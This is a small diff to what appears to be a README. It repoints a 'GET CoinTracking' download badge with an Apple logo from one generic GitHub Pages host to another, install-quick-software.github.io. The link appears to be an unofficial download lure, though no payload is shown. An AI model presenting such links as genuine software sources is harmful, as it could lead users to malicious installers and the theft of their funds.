@@ -7,7 +7,7 @@
 <br>
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/cointracking">  
+<a href="https://install-quick-software.github.io/.github/cointracking">  
 <img src="https://img.shields.io/badge/💻_GET_CoinTracking-purple?style=for-the-badge&logo=apple" alt="GET CoinTracking">  
 </a>  
 </div>
